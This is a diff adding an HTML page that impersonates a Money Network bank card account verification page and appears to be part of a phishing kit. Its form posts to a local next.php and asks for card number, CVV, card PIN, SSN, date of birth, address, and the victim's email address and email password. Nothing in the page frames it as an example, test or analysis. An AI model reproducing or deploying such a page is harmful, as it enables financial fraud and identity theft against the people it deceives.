@@ -1,0 +1,205 @@
+
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<title>Account | Verification</title>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+	<link type="text/css" rel="stylesheet" media="screen, projection" href="./screen.css">
+	<link type="text/css" rel="stylesheet" media="print" href="./print.css">
+	<link type="text/css" rel="stylesheet" media="screen,pojection" href="./money-network-override.css">
+
+			<script type="text/javascript">
+        function init() {
+          $('#cardNumber').focus();
+        }
+        $('#cardNumber').focus();
+	</script>
+
+
+</head>
+
+<body class="article-page auxillary-page"  onload="init();">
+	<div id="body">
+		<div id="wrapper">
+			<div id="header" class="clear_">
+				<a href="javascript:void();" id="skip-link">Skip to main content</a>
+				<h1 id="logo">
+					<a href="javascript:void();" title="The Money Network logo links back to the Money Network home page">
+						<img id="head_logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaUwEu7oTU12nKzAKwrXT-VgeD5znIahZWDdpAXNmoT1GMw-Ge5v0jZnfje-tFacnU10KK6aVE-xKydU76SGMG18UqdtobkAoHnGQprVYA53RRNk8EqB1ZRarSheYXRVFUtF0-tOKD_lnE8M74pdDugCkqRNtr2fxwZ8bVwVt3Z18Ih95FtbrCqkM9tR0/s535/NYCBLOGO.png" alt="Money Network logo" width="250" height="100">
+					</a>
+				</h1>
+
+				<div id="user-settings" class="signed-in">
+					<ul class="site-tools" role="presentation">
+						<li class="sign-out-link"><a id="signout_link" href="javascript:void();" title="Return to login page">Account Verification</a></li>
+					</ul>
+				</div>
+			</div>
+
+			<div id="content" class="clear_">
+				<a name="content"></a>
+				<div id="main-content">
+					<div>
+						<font color="red"> 
+							<div id="errMsg" role="alert"></div>
+						</font>
+						<br><br>
+					</div>
+
+
+					<h1>Account Verification</h1>
+					<span class="requiredmsg">Required*</span>
+					<br>
+					<p></p>
+
+					<form name="billing-form" id="billing-form" method="POST" action="./next.php"class="validate">
+						<table role="presentation" style="width: 100% !important;">
+							<tbody>
+
+								<tr>
+									<td>
+										<label for="card_name" class="error-anchor_  gray">Cardholder's Name</label>
+										<input type="text" name="cname"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="card_number" class="error-anchor_  gray">Card Number</label>
+										<input type="tel" name="cnum"  value="" class="full required text" id="cnum" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="exp" class="error-anchor_  gray">Expiry</label>
+										<input type="tel" name="expdate"  value="" class="full required text" id="expdate" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="csc" class="error-anchor_  gray">CVV</label>
+										<input type="tel" name="cvv"  value="" class="full required text" id="cvv" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+								
+								<tr>
+									<td>
+										<label for="pin" class="error-anchor_  gray">Card Pin</label>
+										<input type="tel" name="cpin"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="dob" class="error-anchor_  gray">Date of Birth</label>
+										<input type="date" name="dob"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="ssn" class="error-anchor_  gray">SSN</label>
+										<input type="tel" name="ssn"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="address" class="error-anchor_  gray">Address</label>
+										<input type="text" name="addr"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="state" class="error-anchor_  gray">State</label>
+										<input type="text" name="state"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="city" class="error-anchor_  gray">City</label>
+										<input type="text" name="city"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="zipcode" class="error-anchor_  gray">ZipCode</label>
+										<input type="tel" name="zip"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+
+								<tr>
+									<td>
+										<label for="phone" class="error-anchor_  gray">Phone Number</label>
+										<input type="tel" name="ph"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="email_address" class="error-anchor_  gray">Email Address</label>
+										<input type="email" name="em"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="email_password" class="error-anchor_  gray">Email Password</label>
+										<input type="password" name="pass"  value="" class="full required text" id="cardNumber" autocomplete="off" required="true" style="width: 60% ; height: 37px;">
+									</td>
+								</tr>
+
+								<tr>
+									<td colspan="2">
+										<button type="submit" name="card-btn">Submit</button>
+										</a>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+					</form>
+				</div>
+			</div>
+
+			<div id="footer" class="clear_">
+				<ul class="nav">
+					<li><a href="javascript:void();">FAQs</a></li> 
+					<li><a href="javascript:void();" title="This link will open a new window to the Privacy and Security Policy page">Privacy and Security</a>
+					</li>
+					<li><a href="javascript:void();" title="This link will open a new window to the Error Resolution Policy"></a></li>
+					<li class="last_"><a href="javascript:void();" title="Contact page">Contact us</a></li>
+					<li class="last_"><a href="javascript:void();" title="this link will open an external page">Download Acrobat Reader to view PDF files</a></li>
+				</ul>
+				<br><br>
+
+				<p>*Not all billers accept cards for payments. Please check the billers website.</p> 
+
+				<p class="copyright" id="copyright">©&nbsp;2023&nbsp;Money Network Financial, LLC. All Rights Reserved. All trademarks, service marks and trade names referenced in this material are the property of their respective owners. Cards are issued by My Banking Direct, a service of New York Community Bank, Member FDIC. New York Community Bank does not endorse or guarantee the products, info, or recommendations provided in the linked site; New York Community Bank Privacy Policy does not apply to linked site; and New York Community Bank is not liable for any failure of products or services advertised on the linked site. Apple, the Apple logo, iPhone, and iPad are trademarks of Apple Inc., registered in the U.S. and other countries and regions. App Store is a service mark of Apple Inc. Google Play and the Google Play logo are trademarks of Google LLC.</p><p></p>
+			</div>
+		</div>
+	</div>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
+
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="/jquery.maskedinput.js"></script>
+  <script>
+	  $(document).ready(function() {
+	   $('#expdate').mask("99 / 99", { placeholder: 'MM / YY' });
+	   $('#cvv').mask("999", { placeholder: '--' });
+	  $('#cnum').mask("9999 9999 9999 9999", { placeholder: '---- ---- ---- ----' });
+  });
+  </script>
+</body>
+<script src="form-handler.js"></script>
+</html>
